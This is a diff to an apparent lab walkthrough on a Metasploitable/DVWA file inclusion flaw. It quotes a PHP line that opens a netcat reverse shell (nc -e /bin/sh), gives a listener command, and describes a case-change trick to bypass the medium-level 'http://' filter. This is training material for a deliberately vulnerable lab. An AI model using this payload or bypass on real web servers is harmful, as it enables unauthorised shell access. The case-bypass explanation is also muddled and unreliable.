@@ -133,10 +133,23 @@ passthru("nc -e /bin/sh 8080");
 - If not, To start the apache2 server run the command `sudo service apache2 start`.
 - Now open the webbrowser and try to access the file in webbrowser.
 - ![image](https://github.com/stellados53/vulnerabilities-Metasploitable-/assets/142677726/f16a0ddb-eeac-4750-981f-0170a66348e0)
-- now copy the url and paste it from the `?page=`..remove`include.php`. this looks like..
-- ![image](https://github.com/stellados53/vulnerabilities-Metasploitable-/assets/142677726/8edf1c00-e4ca-4e74-afea-dfff1cdf1dc7)
-- now open the terminal and run `nc -vv -l -p 8080` to recieve the reverse connection.
-- as we click enter in the webbrowser. this makes the connection in the command terminal with the webbrowser.
-- ![Screenshot 2024-04-20 162650](https://github.com/stellados53/vulnerabilities-Metasploitable-/assets/142677726/edebbc23-9355-4bfa-97a2-c8335a10cc3c)
+
+> __Security at LOW:__
+> 
+> now copy the url and paste it from the `?page=`..remove`include.php`. and add a `?`..this looks like..
+> ![image](https://github.com/stellados53/vulnerabilities-Metasploitable-/assets/142677726/8edf1c00-e4ca-4e74-afea-dfff1cdf1dc7)
+> now open the terminal and run `nc -vv -l -p 8080` to recieve the reverse connection.
+> as we click enter in the webbrowser. this makes the connection in the command terminal with the webbrowser.
+> ![Screenshot 2024-04-20 162650](https://github.com/stellados53/vulnerabilities-Metasploitable-/assets/142677726/edebbc23-9355-4bfa-97a2-c8335a10cc3c)
+>
+> __Security at MEDIUM__:
+>
+> the process is as same as the LOW SECURITY..but as there is a `http://` in the middle of the URL...
+> So rename intead of `tt` in the `http://` rename it as `TT` i.e., `https://`.
+> ![image](https://github.com/stellados53/vulnerabilities-Metasploitable-/assets/142677726/30ead58e-eb9b-482f-bf51-2bbb7e7c5968)
+>
+> __Security at HIGH__: the expoit is impossible because it retrieves only `include.php` page.cannot access another files it, so it is difficult to exploit them.
+> 
+
 
 
